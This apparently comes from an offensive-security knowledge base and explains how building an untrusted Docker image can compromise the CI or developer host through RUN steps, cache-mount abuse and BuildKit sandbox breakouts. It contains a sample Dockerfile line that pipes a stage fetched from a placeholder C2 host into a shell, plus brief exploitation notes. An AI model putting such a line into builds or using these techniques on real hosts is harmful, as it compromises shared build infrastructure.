---
title: "BuildKit RCE: code execution on the image build host"
description: "Executing code on the build host through a malicious Dockerfile and build context or through BuildKit flaws, including the build-time container breakouts, turning the act of building an untrusted image into compromise of the CI or developer host that builds it."
keywords:
  - buildkit
  - build host RCE
  - malicious Dockerfile
  - leaky vessels
  - CI compromise
---

# BuildKit RCE

Building an image runs the Dockerfile's instructions on the build host, which in CI is a shared, often privileged machine. A malicious Dockerfile or build context can reach the host: `RUN` executes arbitrary commands, mounts and cache features can touch host paths, and BuildKit frontend and runtime flaws have allowed breaking out of the build sandbox entirely.

```dockerfile
# RUN executes on the builder; in a privileged or loosely sandboxed builder it reaches the host
RUN curl -s http://c2/stage1 | sh

# Build-time breakout variants abuse leaked descriptors and working-directory handling
```

## Exploitation notes

- The target is the CI or developer host, not a deployed container: building an attacker-supplied image is the trigger.
- Cache poisoning and `--mount=type=cache,source=` abuse can write to host-reachable paths on a misconfigured builder.
- The runtime-level build breakouts are the build-time face of [Leaky Vessels](../../../container-escape/runtime-and-kernel-exploits/runc-and-containerd-exploits/leaky-vessels.md).

## References

- [BuildKit](https://github.com/moby/buildkit)
- [Docker build drivers and security](https://docs.docker.com/build/builders/)
